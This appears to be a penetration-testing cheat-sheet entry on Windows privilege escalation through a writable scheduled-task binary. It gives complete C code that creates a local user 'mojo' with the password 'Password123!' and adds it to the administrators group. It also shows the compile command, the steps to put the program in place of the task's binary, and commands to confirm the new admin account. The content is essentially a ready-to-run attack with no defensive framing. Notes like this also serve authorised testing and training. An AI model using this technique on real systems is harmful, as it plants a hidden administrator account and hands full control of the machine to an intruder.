# Scheduled Tasks

Used when we have write privileges over a binary ran by a task owned by a privileged user.

**adduser.c**

```c
#include <stdlib.h>

int main ()
{
  int i;
  i = system ("net user mojo Password123! /add");
  i = system ("net localgroup administrators mojo /add");
  return 0;
}
```

```bash
# Compile
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```powershell
mv task_path\privileged_binary.exe backups\privileged_binary.exe.bak
mv adduser.exe task_path\privileged_binary.exe
```

Then after a minute we can check and see that our new user has been created!

```powershell
Get-LocalUser
# mojo is visible
Get-LocalGroupMember Administrators
# mojo is visible
```
